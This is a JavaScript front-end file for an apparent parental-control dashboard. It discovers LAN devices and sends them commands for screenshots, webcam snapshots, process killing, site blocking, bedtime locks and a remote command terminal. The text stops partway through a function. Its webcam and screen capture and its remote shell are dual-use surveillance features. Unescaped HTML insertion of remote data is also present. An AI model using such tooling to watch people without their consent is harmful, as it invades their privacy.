'use strict';

var devices       = [];
var selectedDev   = null;
var activeIdx     = -1;
var allProcs      = [];
var filteredProcs = [];
var currentPage   = 1;
var PAGE_SIZE     = 20;
var termHistory   = [];
var termHistIdx   = -1;
var confirmCb     = null;
var isScanning    = false;
var currentFilter = 'all'; // 'all', 'online', 'offline'
var currentAppConfig = { max_clients: 10, auto_scan_interval: 5 };
var autoScanTimer = null;

// Per-Device In-Memory Cache
// Structure: { [deviceId]: { procs: [], sysinfo: null, screenshots: [], activeScreenshotIdx: 0, webcam: [], activeWebcamIdx: 0 } }
var deviceCache = {};

function getDevCache(id) {
    if (!id) return null;
    if (!deviceCache[id]) {
        deviceCache[id] = { procs: [], sysinfo: null, screenshots: [], activeScreenshotIdx: 0, webcam: [], activeWebcamIdx: 0 };
    }
    return deviceCache[id];
}

function extractData(res) {
    if (!res) return null;
    if (typeof res === 'string') {
        try { res = JSON.parse(res); } catch (e) {}
    }
    if (Array.isArray(res)) return res;
    if (res && res.data !== undefined) {
        if (typeof res.data === 'string') {
            try { res.data = JSON.parse(res.data); } catch (e) {}
        }
        if (Array.isArray(res.data)) return res.data;
        return res.data;
    }
    return res;
}

$(function() {
    window.djazair.invoke('getSettings').then(function(sRes) {
        if (sRes && sRes.ok && sRes.data) {
            currentAppConfig = sRes.data;
            applyAutoScanInterval(currentAppConfig.auto_scan_interval !== undefined ? currentAppConfig.auto_scan_interval : 5);
        } else {
            applyAutoScanInterval(5);
        }
        
        window.djazair.invoke('loadDevices').then(function(res) {
            var d = extractData(res);
            devices = Array.isArray(d) ? d : [];
            renderDevices();
            if (devices.length > 0) selectDevice(0);
            performScan(false);
        });
    });
});

var ICONS = { success: 'fa-circle-check', danger: 'fa-circle-xmark', warning: 'fa-triangle-exclamation', info: 'fa-circle-info' };

function toast(msg, type) {
    type = type || 'info';
    var el = $('<div class="toast-item ' + type + '"></div>');
    el.html('<i class="fa-solid ' + (ICONS[type] || ICONS.info) + '" style="color:var(--' + (type === 'info' ? 'accent' : type === 'warning' ? 'warning' : type) + ');"></i><span>' + msg + '</span>');
    $('#toastWrap').append(el);
    setTimeout(function() { el.fadeOut(300, function() { el.remove(); }); }, 3500);
}

function confirmAction(title, body, cb) {
    $('#confirmTitle').text(title);
    $('#confirmBody').text(body);
    confirmCb = cb;
    new bootstrap.Modal('#confirmModal').show();
}
$('#confirmOk').on('click', function() {
    bootstrap.Modal.getInstance('#confirmModal').hide();
    if (confirmCb) confirmCb();
    confirmCb = null;
});

// ═════════════════════════════════════════════════════════════════════════════
// Sidebar Filtering & Device List
// ═════════════════════════════════════════════════════════════════════════════

function setFilter(type) {
    currentFilter = type;
    $('.filter-pill').removeClass('active online offline');
    if (type === 'all') $('#filterAll').addClass('active');
    else if (type === 'online') $('#filterOnline').addClass('active online');
    else if (type === 'offline') $('#filterOffline').addClass('active offline');
    renderDevices();
}

function renderDevices() {
    var onlineCount = 0;
    var offlineCount = 0;
    devices.forEach(function(d) {
        if (d.is_online) onlineCount++;
        else offlineCount++;
    });

    $('#filterAll').text('All (' + devices.length + ')');
    $('#filterOnline').text('Online (' + onlineCount + ')');
    $('#filterOffline').text('Offline (' + offlineCount + ')');

    var list = $('#deviceList');
    list.empty();

    var visibleDevices = devices.filter(function(d) {
        if (currentFilter === 'online') return d.is_online;
        if (currentFilter === 'offline') return !d.is_online;
        return true;
    });

    if (visibleDevices.length === 0) {
        list.html('<div class="empty-state" style="padding:24px 12px; font-size:12px;"><i class="fa-solid fa-magnifying-glass-location" style="font-size:26px; margin-bottom:10px;"></i><br>No devices in this category.</div>');
        return;
    }

    visibleDevices.forEach(function(dev) {
        var originalIdx = devices.indexOf(dev);
        var devId = dev.id || ('KC-' + dev.ip);
        var active = (selectedDev && (selectedDev.id === devId || selectedDev.ip === dev.ip)) ? 'active' : '';
        var isOnline = !!dev.is_online;
        var offlineClass = isOnline ? '' : 'offline';
        var displayName = dev.custom_name || dev.hostname || dev.ip;
        var dotTitle = isOnline ? 'Agent Online' : 'Agent Offline';

        var item = $('<div class="dev-item ' + active + ' ' + offlineClass + '"></div>');
        item.html(
            '<div class="dev-avatar"><i class="fa-solid fa-laptop"></i></div>' +
            '<div class="dev-info">' +
                '<div class="dev-name" title="' + displayName + '">' + displayName + '</div>' +
                '<div class="dev-id-badge"><i class="fa-solid fa-network-wired"></i> ' + dev.ip + ' &bull; ' + (isOnline ? '<span style="color:var(--success)">Online</span>' : '<span style="color:var(--text-muted)">Offline</span>') + '</div>' +
            '</div>' +
            '<div class="dev-dot ' + (isOnline ? '' : 'offline') + '" title="' + dotTitle + '"></div>' +
            '<button class="dev-remove" title="Remove device from list"><i class="fa-solid fa-xmark"></i></button>'
        );
        item.on('click', function() { selectDevice(originalIdx); });
        item.find('.dev-remove').on('click', function(e) { e.stopPropagation(); removeDevice(originalIdx); });
        list.append(item);
    });
}

function selectDevice(idx) {
    activeIdx = idx;
    selectedDev = devices[idx];
    if (!selectedDev) return;
    if (!selectedDev.id) selectedDev.id = 'KC-' + selectedDev.ip;
    renderDevices();

    var isOnline = !!selectedDev.is_online;
    var displayName = selectedDev.custom_name || selectedDev.hostname || selectedDev.ip;
    $('#topbarTitle').text(displayName);
    $('#editNameBtn').show();
    $('#welcomeScreen').hide();
    $('#controlPanel').css('display', 'flex');
    $('#termLabel').text('Remote Terminal — ' + displayName + ' (' + selectedDev.ip + ')');

    // Update Live/Offline State
    setDeviceLiveState(isOnline);

    // Fast Cache Hydration
    var devId = selectedDev.id;
    var cache = getDevCache(devId);

    // If cache is empty in memory, attempt to load from disk cache
    if (!cache.procs || cache.procs.length === 0 || !cache.sysinfo) {
        window.djazair.invoke('loadDiskCache', { id: devId }).then(function(res) {
            var diskData = extractData(res);
            if (diskData && typeof diskData === 'object') {
                if (diskData.procs && (!cache.procs || cache.procs.length === 0)) cache.procs = diskData.procs;
                if (diskData.sysinfo && !cache.sysinfo) cache.sysinfo = diskData.sysinfo;
            }
            hydrateUiFromCache(cache, isOnline);
        });
    } else {
        hydrateUiFromCache(cache, isOnline);
    }

    // Load Screenshot & Webcam Galleries
    loadScreenshotHistory();
    loadWebcamHistory();
}

function hydrateUiFromCache(cache, isOnline) {
    if (cache.procs && cache.procs.length > 0) {
        allProcs = cache.procs;
        filteredProcs = allProcs.slice();
        currentPage = 1;
        renderProcs();
        $('#procCount').text(allProcs.length + ' processes' + (isOnline ? '' : ' (cached)'));
    } else {
        allProcs = [];
        filteredProcs = [];
        renderProcs();
    }

    if (cache.sysinfo) {
        renderSysinfo(cache.sysinfo);
    } else {
        $('#sysinfoGrid').html('<div class="empty-state" style="grid-column:1/-1; padding:40px;"><i class="fa-solid fa-server"></i>' + (isOnline ? 'Click Refresh to load system info.' : 'No cached system info available.') + '</div>');
    }
}

function setDeviceLiveState(isOnline) {
    if (isOnline) {
        $('#topbarBadge').html(
            '<span class="badge-online"><i class="fa-solid fa-circle" style="font-size:6px;"></i> Online</span> ' +
            '<span class="badge-id" title="' + selectedDev.id + '">' + selectedDev.id.slice(0, 14) + '...</span>'
        );
        $('#pingBtn').show();
        $('#overviewOfflineBanner').hide();
        $('.live-action').removeClass('live-locked');
        $('.live-btn').prop('disabled', false);
        $('#msgInput').prop('disabled', false);
        $('#termIn').prop('disabled', false);
    } else {
        $('#topbarBadge').html(
            '<span class="badge-offline"><i class="fa-solid fa-circle" style="font-size:6px;"></i> Offline</span> ' +
            '<span class="badge-id" title="' + selectedDev.id + '">' + selectedDev.id.slice(0, 14) + '...</span>'
        );
        $('#pingBtn').hide();
        $('#overviewOfflineBanner').show();
        $('.live-action').addClass('live-locked');
        $('.live-btn').prop('disabled', true);
        $('#msgInput').prop('disabled', true);
        $('#termIn').prop('disabled', true);
    }
}

function openRenameModal() {
    if (!selectedDev) return;
    $('#renameInput').val(selectedDev.custom_name || selectedDev.hostname || '');
    new bootstrap.Modal('#renameModal').show();
}

function saveDeviceNickname() {
    if (!selectedDev) return;
    var newName = $('#renameInput').val().trim();
    selectedDev.custom_name = newName;
    window.djazair.invoke('saveDevices', devices);
    bootstrap.Modal.getInstance('#renameModal').hide();
    renderDevices();
    $('#topbarTitle').text(newName || selectedDev.hostname || selectedDev.ip);
    toast('Profile name updated!', 'success');
}

function removeDevice(idx) {
    var wasSelected = selectedDev && devices[idx].ip === selectedDev.ip;
    devices.splice(idx, 1);
    window.djazair.invoke('saveDevices', devices);
    if (wasSelected) {
        selectedDev = null;
        $('#controlPanel').hide();
        $('#welcomeScreen').show();
        $('#topbarTitle').text('No device selected');
        $('#editNameBtn').hide();
        $('#topbarBadge').html('');
        $('#pingBtn').hide();
    }
    renderDevices();
}

function addManualDevice() {
    var ip = $('#manualIp').val().trim();
    if (!ip) return;
    if (devices.some(function(d) { return d.ip === ip; })) { toast('Device already in the list.', 'warning'); return; }
    var newDev = { id: 'KC-' + ip, ip: ip, hostname: ip, custom_name: '', is_online: false };
    devices.push(newDev);
    window.djazair.invoke('saveDevices', devices);
    $('#manualIp').val('');
    renderDevices();
    toast('Device added: ' + ip, 'success');
}

// ═════════════════════════════════════════════════════════════════════════════
// Network Discovery Scanner
// ═════════════════════════════════════════════════════════════════════════════

function performScan(isManual) {
    if (isScanning) return;
    isScanning = true;

    if (isManual) {
        var btn = $('#scanBtn');
        btn.html('<span class="spin"></span> Checking...');
        btn.prop('disabled', true);
    }
    
    window.djazair.invoke('scanNetwork').then(function(res) {
        isScanning = false;
        
        if (isManual) {
            var btn = $('#scanBtn');
            btn.html('<i class="fa-solid fa-radar"></i> Scan Network');
            btn.prop('disabled', false);
        }
        var found = extractData(res);
        if (!Array.isArray(found)) found = [];

        var updatedMap = {};
        found.forEach(function(f) {
            var key = f.id || ('KC-' + f.ip);
            updatedMap[key] = f;
        });

        // Update online/offline state strictly according to backend liveness
        devices.forEach(function(d) {
            var key = d.id || ('KC-' + d.ip);
            if (updatedMap[key]) {
                d.is_online = !!updatedMap[key].is_online;
                d.ip = updatedMap[key].ip;
                d.hostname = updatedMap[key].hostname;
                if (updatedMap[key].custom_name) d.custom_name = updatedMap[key].custom_name;
            } else {
                d.is_online = false;
            }
        });

        // Add newly discovered devices that weren't in the list
        found.forEach(function(f) {
            var key = f.id || ('KC-' + f.ip);
            var exists = devices.some(function(d) { return (d.id || ('KC-' + d.ip)) === key; });
            if (!exists) {
                devices.push(f);
            }
        });

        renderDevices();

        if (selectedDev) {
            var currKey = selectedDev.id || ('KC-' + selectedDev.ip);
            var matchIdx = devices.findIndex(function(d) { return (d.id || ('KC-' + d.ip)) === currKey; });
            if (matchIdx !== -1) {
                selectedDev = devices[matchIdx];
                setDeviceLiveState(!!selectedDev.is_online);
            }
        }

        if (isManual) {
            var onlineCount = devices.filter(function(d) { return d.is_online; }).length;
            toast('Status refreshed: ' + onlineCount + ' device(s) online.', 'info');
        }
    });
}

function startScan() {
    performScan(true);
}

// ═════════════════════════════════════════════════════════════════════════════
// IPC Command Dispatcher
// ═════════════════════════════════════════════════════════════════════════════

function sendCmd(command, successCb, failCb, retryCount) {
    if (!selectedDev) { toast('No device selected.', 'warning'); return; }
    if (!selectedDev.is_online && command !== 'SYSINFO' && command !== 'TASKS') {
        toast('Cannot send command: Device is offline.', 'warning');
        return;
    }
    retryCount = retryCount || 0;
    
    var reqPayload = {
        id: selectedDev.id || ('KC-' + selectedDev.ip),
        ip: selectedDev.ip,
        hostname: selectedDev.hostname,
        command: command
    };

    window.djazair.invoke('agentCommand', reqPayload).then(function(res) {
        if (!res.ok) {
            if (retryCount < 1 && selectedDev.is_online) {
                setTimeout(function() { sendCmd(command, successCb, failCb, retryCount + 1); }, 300);
                return;
            }
            toast('Connection error: ' + res.data, 'danger');
            if (failCb) failCb(res.data);
            return;
        }

        if (res.data && typeof res.data === 'string' && (res.data.indexOf('ERR:') === 0 || res.data.indexOf('ERROR:') === 0)) {
            toast(res.data, 'danger');
            if (failCb) failCb(res.data);
            return;
        }
        
        if (res.latency !== undefined) {
            var color = res.latency < 50 ? '#2ea043' : (res.latency < 200 ? '#d29922' : '#f85149');
            $('#topbarBadge').html(
                '<span class="badge" style="background: ' + color + '">' + res.latency + ' ms</span> ' +
                '<span class="badge-id">' + (selectedDev.id || selectedDev.ip).slice(0, 14) + '...</span>'
            );
        }
        
        if (successCb) successCb(res.data, res.latency);
    });
}

function switchTab(id) {
    var btn = document.querySelector('[data-bs-target="#' + id + '"]');
    if (btn) bootstrap.Tab.getOrCreateInstance(btn).show();
}

function doPing() {
    sendCmd('PING', function(r, latency) { 
        toast('Pong! Device is online. Latency: ' + latency + 'ms', 'success'); 
    });
}

function doCmd(cmd) {
    sendCmd(cmd, function() { toast(cmd + ' command sent.', 'info'); });
}

function doMsg() {
    var m = $('#msgInput').val().trim();
    if (!m) return;
    sendCmd('MSG:' + m, function() {
        toast('Message sent.', 'success');
        $('#msgInput').val('');
    });
}

// ═════════════════════════════════════════════════════════════════════════════
// Screenshot Gallery & Slideshow System
// ═════════════════════════════════════════════════════════════════════════════

function onScreenshotTabOpened() {
    loadScreenshotHistory();
}

function loadScreenshotHistory() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    window.djazair.invoke('getScreenshotHistory', { id: devId }).then(function(res) {
        var list = extractData(res);
        if (!Array.isArray(list)) list = [];
        var cache = getDevCache(devId);
        cache.screenshots = list;
        renderScreenshotGallery();
    });
}

function renderScreenshotGallery() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    var list = cache.screenshots || [];
    var activeIdx = cache.activeScreenshotIdx || 0;

    $('#galleryCountBadge').text(list.length + ' saved');

    var strip = $('#thumbnailStrip');
    strip.empty();

    if (list.length === 0) {
        strip.html('<div style="color:var(--text-muted); font-size:12px; padding:10px;">No screenshots saved yet. Click "Capture New Screenshot".</div>');
        $('#ss-hero-img').attr('src', '').hide();
        $('#galleryPrevBtn').hide();
        $('#galleryNextBtn').hide();
        $('#deleteSsBtn').hide();
        $('#ss-hero-title').text('No Captures');
        $('#ss-hero-time').text('Capture a screenshot to start');
        $('#ss-hero-counter').text('0 / 0');
        return;
    }

    if (activeIdx < 0) activeIdx = 0;
    if (activeIdx >= list.length) activeIdx = list.length - 1;
    cache.activeScreenshotIdx = activeIdx;

    var currentItem = list[activeIdx];
    $('#ss-hero-img').attr('src', 'data:image/jpeg;base64,' + currentItem.b64).show();
    $('#ss-hero-title').text('Screenshot ' + (activeIdx + 1));
    $('#ss-hero-time').text(currentItem.time);
    $('#ss-hero-counter').text((activeIdx + 1) + ' / ' + list.length);
    $('#galleryPrevBtn').show().prop('disabled', activeIdx <= 0);
    $('#galleryNextBtn').show().prop('disabled', activeIdx >= list.length - 1);
    $('#deleteSsBtn').show();

    list.forEach(function(item, idx) {
        var card = $('<div class="thumb-card ' + (idx === activeIdx ? 'active' : '') + '"></div>');
        card.html(
            '<img src="data:image/jpeg;base64,' + item.b64 + '">' +
            '<div class="thumb-time">' + item.time + '</div>'
        );
        card.on('click', function() { selectScreenshot(idx); });
        strip.append(card);
    });
}

function selectScreenshot(idx) {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    cache.activeScreenshotIdx = idx;
    renderScreenshotGallery();
}

function prevScreenshot() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    if (cache.activeScreenshotIdx > 0) {
        cache.activeScreenshotIdx--;
        renderScreenshotGallery();
    }
}

function nextScreenshot() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    if (cache.screenshots && cache.activeScreenshotIdx < cache.screenshots.length - 1) {
        cache.activeScreenshotIdx++;
        renderScreenshotGallery();
    }
}

function doScreenshot() {
    var btn = $('#ssBtn');
    btn.html('<span class="spin"></span> Capturing...');
    btn.prop('disabled', true);
    sendCmd('SCREENSHOT', function(raw) {
        btn.html('<i class="fa-solid fa-camera-retro"></i> Capture New Screenshot');
        btn.prop('disabled', false);
        if (!raw || typeof raw !== 'string' || !raw.startsWith('SCREENSHOT:')) {
            toast('Failed to capture screenshot from child computer.', 'danger');
            return;
        }
        var b64 = raw.substring(11).trim();
        if (!b64 || b64.startsWith('ERR:')) {
            toast('Screenshot error: ' + b64, 'danger');
            return;
        }
        
        var devId = selectedDev.id || ('KC-' + selectedDev.ip);
        var cache = getDevCache(devId);
        if (!cache.screenshots) cache.screenshots = [];
        
        var d = new Date();
        var timeLabel = d.getFullYear() + '-' + (d.getMonth() + 1) + '-' + d.getDate() + ' ' + d.getHours() + ':' + ('0' + d.getMinutes()).slice(-2) + ':' + ('0' + d.getSeconds()).slice(-2);
        
        cache.screenshots.unshift({
            filename: 'live_' + Date.now() + '.b64',
            time: timeLabel,
            b64: b64
        });
        cache.activeScreenshotIdx = 0;
        saveDevCache(devId);
        renderScreenshotGallery();
        toast('Screenshot captured and archived!', 'success');
        setTimeout(loadScreenshotHistory, 800);
    }, function() {
        btn.html('<i class="fa-solid fa-camera-retro"></i> Capture New Screenshot');
        btn.prop('disabled', false);
    });
}

function deleteActiveScreenshot() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    var list = cache.screenshots || [];
    var activeIdx = cache.activeScreenshotIdx || 0;
    if (list.length === 0 || !list[activeIdx]) return;

    var item = list[activeIdx];
    confirmAction('Delete Screenshot', 'Permanently delete screenshot from ' + item.time + '?', function() {
        window.djazair.invoke('deleteScreenshot', { id: devId, filename: item.filename }).then(function(res) {
            toast('Screenshot deleted.', 'info');
            loadScreenshotHistory();
        });
    });
}

// ═════════════════════════════════════════════════════════════════════════════
// Webcam Gallery & Slideshow System
// ═════════════════════════════════════════════════════════════════════════════

function onWebcamTabOpened() {
    loadWebcamHistory();
}

function loadWebcamHistory() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    window.djazair.invoke('getWebcamHistory', { id: devId }).then(function(res) {
        var list = extractData(res);
        if (!Array.isArray(list)) list = [];
        var cache = getDevCache(devId);
        if (list.length > 0) {
            cache.webcam = list;
            renderWebcamGallery();
        }
    });
}

function renderWebcamGallery() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    var list = cache.webcam || [];
    var activeIdx = cache.activeWebcamIdx || 0;

    $('#webcamCountBadge').text(list.length + ' saved');

    var strip = $('#webcamThumbnailStrip');
    strip.empty();

    if (list.length === 0) {
        strip.html('<div style="color:var(--text-muted); font-size:12px; padding:10px;">No webcam snapshots saved yet. Click "Capture Webcam Snapshot".</div>');
        $('#webcam-hero-img').attr('src', '').hide();
        $('#webcamPrevBtn').hide();
        $('#webcamNextBtn').hide();
        $('#deleteCamBtn').hide();
        $('#webcam-hero-title').text('No Webcam Captures');
        $('#webcam-hero-time').text('Capture a snapshot to start');
        $('#webcam-hero-counter').text('0 / 0');
        return;
    }

    if (activeIdx < 0) activeIdx = 0;
    if (activeIdx >= list.length) activeIdx = list.length - 1;
    cache.activeWebcamIdx = activeIdx;

    var currentItem = list[activeIdx];
    $('#webcam-hero-img').attr('src', 'data:image/jpeg;base64,' + currentItem.b64).show();
    $('#webcam-hero-title').text('Webcam Snapshot ' + (activeIdx + 1));
    $('#webcam-hero-time').text(currentItem.time);
    $('#webcam-hero-counter').text((activeIdx + 1) + ' / ' + list.length);
    $('#webcamPrevBtn').show().prop('disabled', activeIdx <= 0);
    $('#webcamNextBtn').show().prop('disabled', activeIdx >= list.length - 1);
    $('#deleteCamBtn').show();

    list.forEach(function(item, idx) {
        var card = $('<div class="thumb-card ' + (idx === activeIdx ? 'active' : '') + '"></div>');
        card.html(
            '<img src="data:image/jpeg;base64,' + item.b64 + '">' +
            '<div class="thumb-time">' + item.time + '</div>'
        );
        card.on('click', function() { selectWebcam(idx); });
        strip.append(card);
    });
}

function selectWebcam(idx) {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    cache.activeWebcamIdx = idx;
    renderWebcamGallery();
}

function prevWebcam() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    if (cache.activeWebcamIdx > 0) {
        cache.activeWebcamIdx--;
        renderWebcamGallery();
    }
}

function nextWebcam() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    if (cache.webcam && cache.activeWebcamIdx < cache.webcam.length - 1) {
        cache.activeWebcamIdx++;
        renderWebcamGallery();
    }
}

function doWebcam() {
    var btn = $('#camBtn');
    btn.prop('disabled', true).html('<span class="spin"></span> Capturing...');
    sendCmd('WEBCAM', function(raw) {
        btn.prop('disabled', false).html('<i class="fa-solid fa-video"></i> Capture Webcam Snapshot');
        if (!raw || typeof raw !== 'string' || !raw.startsWith('WEBCAM:')) {
            if (raw === 'NO_WEBCAM' || (typeof raw === 'string' && raw.indexOf('NO_WEBCAM') >= 0)) {
                toast('No webcam detected on the child computer.', 'warning');
            } else {
                toast('Failed to capture webcam snapshot.', 'danger');
            }
            return;
        }
        var b64 = raw.substring(7).trim();
        if (!b64 || b64 === 'NO_WEBCAM' || b64.startsWith('ERR:')) {
            toast('No webcam detected or camera access denied.', 'warning');
            return;
        }
        
        var devId = selectedDev.id || ('KC-' + selectedDev.ip);
        var cache = getDevCache(devId);
        if (!cache.webcam) cache.webcam = [];
        
        var d = new Date();
        var timeLabel = d.getFullYear() + '-' + (d.getMonth() + 1) + '-' + d.getDate() + ' ' + d.getHours() + ':' + ('0' + d.getMinutes()).slice(-2) + ':' + ('0' + d.getSeconds()).slice(-2);
        
        cache.webcam.unshift({
            filename: 'live_' + Date.now() + '.b64',
            time: timeLabel,
            b64: b64
        });
        cache.activeWebcamIdx = 0;
        saveDevCache(devId);
        renderWebcamGallery();
        toast('Webcam snapshot captured and archived!', 'success');
        setTimeout(loadWebcamHistory, 800);
    }, function() {
        btn.prop('disabled', false).html('<i class="fa-solid fa-video"></i> Capture Webcam Snapshot');
    });
}

function deleteActiveWebcam() {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);
    var list = cache.webcam || [];
    var activeIdx = cache.activeWebcamIdx || 0;
    if (list.length === 0 || !list[activeIdx]) return;

    var item = list[activeIdx];
    confirmAction('Delete Webcam Snapshot', 'Permanently delete snapshot from ' + item.time + '?', function() {
        window.djazair.invoke('deleteWebcam', { id: devId, filename: item.filename }).then(function(res) {
            toast('Webcam snapshot deleted.', 'info');
            loadWebcamHistory();
        });
    });
}

function openLightbox(src) {
    if (!src) return;
    $('#lightboxImg').attr('src', src);
    $('#lightbox').css('display', 'flex');
}
function closeLightbox() { $('#lightbox').hide(); }

// ═════════════════════════════════════════════════════════════════════════════
// Processes Management & Caching
// ═════════════════════════════════════════════════════════════════════════════

function onProcessesTabOpened() {
    if (allProcs.length === 0) doLoadProcesses(false);
}

function doLoadProcesses(forceRefresh) {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);

    if (!forceRefresh && cache.procs && cache.procs.length > 0) {
        allProcs = cache.procs;
        filteredProcs = allProcs.slice();
        currentPage = 1;
        renderProcs();
        $('#procCount').text(allProcs.length + ' processes (cached)');
        return;
    }

    if (!selectedDev.is_online) {
        toast('Cannot refresh: Child device is offline.', 'warning');
        return;
    }

    var btn = $('#refreshProcBtn');
    btn.html('<span class="spin"></span> Loading...');
    btn.prop('disabled', true);
    $('#procBody').html('<tr><td colspan="6"><div class="empty-state" style="padding:20px;"><span class="spin"></span> Fetching process list...</div></td></tr>');

    sendCmd('TASKS', function(raw) {
        btn.html('<i class="fa-solid fa-rotate-right"></i> Refresh');
        btn.prop('disabled', false);
        var csv  = raw.startsWith('TASKS:') ? raw.substring(6) : raw;
        allProcs = parseCSV(csv);
        cache.procs = allProcs; // Save to Cache
        window.djazair.invoke('saveDiskCache', { id: devId, data: { procs: cache.procs, sysinfo: cache.sysinfo } });
        filteredProcs = allProcs.slice();
        currentPage   = 1;
        renderProcs();
        $('#procCount').text(allProcs.length + ' processes');
        toast('Loaded ' + allProcs.length + ' processes.', 'success');
    }, function() {
        btn.html('<i class="fa-solid fa-rotate-right"></i> Refresh');
        btn.prop('disabled', false);
    });
}

function parseCSV(csv) {
    var rows = [];
    csv = csv.replace(/\\r\\n/g, '\n').replace(/\\n/g, '\n');
    var lines = csv.split(/\r\n|\n|\r/);
    for (var i = 0; i < lines.length; i++) {
        var line = lines[i].trim();
        if (!line) continue;
        var parts = line.split('","');
        if (parts.length >= 5) {
            rows.push({
                name:    parts[0].replace(/"/g, '').trim(),
                pid:     parts[1].replace(/"/g, '').trim(),
                session: parts[2].replace(/"/g, '').trim(),
                mem:     parts[4].replace(/"/g, '').trim()
            });
        }
    }
    return rows;
}

function filterProcs() {
    var q = $('#procSearch').val().toLowerCase();
    filteredProcs = q ? allProcs.filter(function(p) { return p.name.toLowerCase().indexOf(q) >= 0; }) : allProcs.slice();
    currentPage = 1;
    renderProcs();
    $('#procCount').text(filteredProcs.length + ' / ' + allProcs.length + ' processes');
}

function renderProcs() {
    var totalPages = Math.max(1, Math.ceil(filteredProcs.length / PAGE_SIZE));
    var start      = (currentPage - 1) * PAGE_SIZE;
    var slice      = filteredProcs.slice(start, start + PAGE_SIZE);

    $('#pageInfo').text('Page ' + currentPage + ' of ' + totalPages);
    $('#prevBtn').prop('disabled', currentPage <= 1);
    $('#nextBtn').prop('disabled', currentPage >= totalPages);

    var body = $('#procBody');
    body.empty();

    if (slice.length === 0) {
        body.html('<tr><td colspan="6"><div class="empty-state" style="padding:20px;">No processes found.</div></td></tr>');
        return;
    }

    var isOnline = selectedDev && selectedDev.is_online;

    slice.forEach(function(p, i) {
        var row = $('<tr></tr>');
        var rowNum = start + i + 1;
        var procName = p.name;
        row.html(
            '<td style="color:var(--text-muted); font-size:11px;">' + rowNum + '</td>' +
            '<td class="proc-name">' + procName + '</td>' +
            '<td class="proc-pid">' + p.pid + '</td>' +
            '<td class="proc-mem" style="color:var(--text-muted);">' + p.session + '</td>' +
            '<td class="proc-mem">' + p.mem + '</td>' +
            '<td><button class="btn-icon danger kill-btn ' + (isOnline ? '' : 'live-btn') + '" title="Terminate process" ' + (isOnline ? '' : 'disabled') + '><i class="fa-solid fa-skull" style="font-size:11px;"></i></button></td>'
        );
        if (isOnline) {
            row.find('.kill-btn').on('click', function() { doKillProc(procName); });
        }
        body.append(row);
    });
}

function doKillProc(name) {
    confirmAction('Terminate Process', 'Force-kill "' + name + '" on the remote device?', function() {
        sendCmd('KILL:' + name, function() {
            toast('Terminated: ' + name, 'success');
            setTimeout(function() { doLoadProcesses(true); }, 600);
        });
    });
}

function prevPage() { if (currentPage > 1) { currentPage--; renderProcs(); } }
function nextPage() { var t = Math.ceil(filteredProcs.length / PAGE_SIZE); if (currentPage < t) { currentPage++; renderProcs(); } }

function doBlock()   { var d = $('#domainInput').val().trim(); if (d) sendCmd('BLOCK:'   + d, function() { toast('Blocked: '   + d, 'success'); }); }
function doUnblock() { var d = $('#domainInput').val().trim(); if (d) sendCmd('UNBLOCK:' + d, function() { toast('Unblocked: ' + d, 'success'); }); }

// ═════════════════════════════════════════════════════════════════════════════
// Remote Terminal
// ═════════════════════════════════════════════════════════════════════════════

function termPrint(cls, text) {
    var out = $('#termOut');
    out.append('<span class="' + cls + '">' + text + '</span>');
    out.scrollTop(out[0].scrollHeight);
}

function clearTerm() {
    $('#termOut').html('<span class="t-sys">// Terminal cleared.\n\n</span>');
}

function runTerm() {
    var inp = $('#termIn');
    var cmd = inp.val().trim();
    if (!cmd) return;
    termHistory.unshift(cmd);
    termHistIdx = -1;
    inp.val('');
    termPrint('t-cmd', 'C:\\> ' + cmd + '\n');
    sendCmd('EXEC:' + cmd, function(raw) {
        var out = raw.startsWith('EXEC_RESULT:') ? raw.substring(12) : raw;
        termPrint('t-out', out.trim() + '\n\n');
    }, function(err) {
        termPrint('t-err', 'Error: ' + err + '\n\n');
    });
}

function termKeydown(e) {
    if (e.key === 'Enter') { runTerm(); return; }
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        termHistIdx = Math.min(termHistIdx + 1, termHistory.length - 1);
        if (termHistory[termHistIdx] !== undefined) $('#termIn').val(termHistory[termHistIdx]);
    }
    if (e.key === 'ArrowDown') {
        e.preventDefault();
        termHistIdx = Math.max(termHistIdx - 1, -1);
        $('#termIn').val(termHistIdx >= 0 ? termHistory[termHistIdx] : '');
    }
}

function doActiveWindow() {
    if(!selectedDev) return;
    toast("Requesting active window...", "info");
    sendCmd('ACTIVE_WINDOW', function(res) {
        var text = res;
        if(text.startsWith("ACTIVE_WINDOW:")) text = text.substring(14);
        alert("Currently Active Window:\n\n" + text);
    });
}

function doSetSchedule() {
    if(!selectedDev) return;
    var limit = prompt("Enter bedtime hour (0-23). The computer will automatically lock after this hour every day.\n\nEnter 0 to disable:", "22");
    if(limit !== null) {
        var h = parseInt(limit, 10);
        if(!isNaN(h) && h >= 0 && h <= 23) {
            sendCmd("SCHEDULE:" + h, function(res) {
                if(res.startsWith("OK:")) toast("Bedtime schedule saved successfully!", "success");
                else toast("Failed to set schedule", "danger");
            });
        } else {
            alert("Please enter a valid hour (0-23)");
        }
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// System Information & Caching
// ═════════════════════════════════════════════════════════════════════════════

function onSysinfoTabOpened() {
    doSysinfo(false);
}

function renderSysinfo(info) {
    var grid = $('#sysinfoGrid');
